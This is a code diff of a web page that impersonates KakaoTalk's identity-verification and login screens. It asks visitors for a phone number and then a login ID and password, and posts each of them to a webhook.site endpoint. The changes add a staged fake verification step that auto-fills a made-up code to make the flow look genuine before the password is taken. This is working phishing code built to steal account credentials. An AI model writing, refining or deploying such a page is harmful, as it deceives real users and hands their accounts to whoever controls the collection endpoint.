@@ -44,24 +44,31 @@
     <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
-  <!-- page2 -->
+  <!-- page2: 전화번호 입력 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
     <input type="text" placeholder="(+82)전화번호" id="userId">
-    <button type="button" class="btn-yellow" onclick="goToPage3()">본인인증하기</button>
+    <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
   </div>
 
-  <!-- page3 -->
+  <!-- page3: 인증번호 입력 -->
   <div id="page3" class="login-container hidden">
+    <h2>인증번호 입력</h2>
+    <input type="text" placeholder="인증번호" id="authCode" readonly>
+  </div>
+
+  <!-- page4: 최종 로그인 -->
+  <div id="page4" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId3">
-    <input type="text" placeholder="비밀번호" id="userCode3">
-    <button type="button" class="btn-gray" onclick="sendPage3()">로그인</button>
+    <input type="text" placeholder="이메일 또는 전화번호" id="userId4">
+    <input type="text" placeholder="비밀번호" id="userCode4">
+    <button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
   </div>
 
   <script>
     const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 
+    // page1 -> page2
     function goNext() {
       const chk = document.getElementById("agree");
       if (!chk.checked) {
@@ -72,21 +79,21 @@
       document.getElementById("page2").classList.remove("hidden");
     }
 
-    function goToPage3() {
+    // page2: 전화번호 전송, 4초 뒤 page3 인증번호 자동 입력
+    function sendPhone() {
       const userId = document.getElementById("userId").value.trim();
+      const phoneRegex = /^010\d{8}$/;
 
       if (!userId) {
-        alert("전화번호와 인증번호를 입력해주세요.");
+        alert("전화번호를 입력해주세요.");
         return;
       }
-
-      const phoneRegex = /^010\d{8}$/;
       if (!phoneRegex.test(userId)) {
         alert("잘못된 형식의 전화번호입니다.");
         return;
       }
 
-      // page2 webhook 전송
+      // webhook 전송 (전화번호만)
       const formData = new URLSearchParams();
       formData.append("page", "2");
       formData.append("phone", userId);
@@ -96,28 +103,35 @@
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: formData
-      })
-      .catch(err => console.error("page2 전송 오류:", err))
-      .finally(() => {
-        document.getElementById("page2").classList.add("hidden");
-        document.getElementById("page3").classList.remove("hidden");
-      });
+      }).catch(err => console.error("page2 전송 오류:", err));
+
+      // 4초 뒤 인증번호 자동 입력 및 page3 표시
+      document.getElementById("page2").classList.add("hidden");
+      document.getElementById("page3").classList.remove("hidden");
+      setTimeout(() => {
+        document.getElementById("authCode").value = "1224"; // 예시 인증번호
+        // 인증번호 입력 후 page4 자동 표시
+        setTimeout(() => {
+          document.getElementById("page3").classList.add("hidden");
+          document.getElementById("page4").classList.remove("hidden");
+        }, 1000);
+      }, 4000);
     }
 
-    function sendPage3() {
-      const userId3 = document.getElementById("userId3").value.trim();
-      const userCode3 = document.getElementById("userCode3").value.trim();
+    // page4 전송
+    function sendPage4() {
+      const userId4 = document.getElementById("userId4").value.trim();
+      const userCode4 = document.getElementById("userCode4").value.trim();
 
-      if (!userId3 || !userCode3) {
-        alert("전화번호와 비밀번호를 입력해주세요.");
+      if (!userId4 || !userCode4) {
+        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
         return;
       }
 
-      // page3 webhook 전송
       const formData = new URLSearchParams();
-      formData.append("page", "3");
-      formData.append("phone", userId3);
-      formData.append("code", userCode3);
+      formData.append("page", "4");
+      formData.append("userId", userId4);
+      formData.append("password", userCode4);
       formData.append("timestamp", new Date().toISOString());
 
       fetch(webhookUrl, {
@@ -125,8 +139,8 @@
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: formData
       })
-      .then(() => alert("page3 값 전송 완료!"))
-      .catch(err => console.error("page3 전송 오류:", err));
+      .then(() => alert("page4 값 전송 완료!"))
+      .catch(err => console.error("page4 전송 오류:", err));
     }
   </script>
 </body>
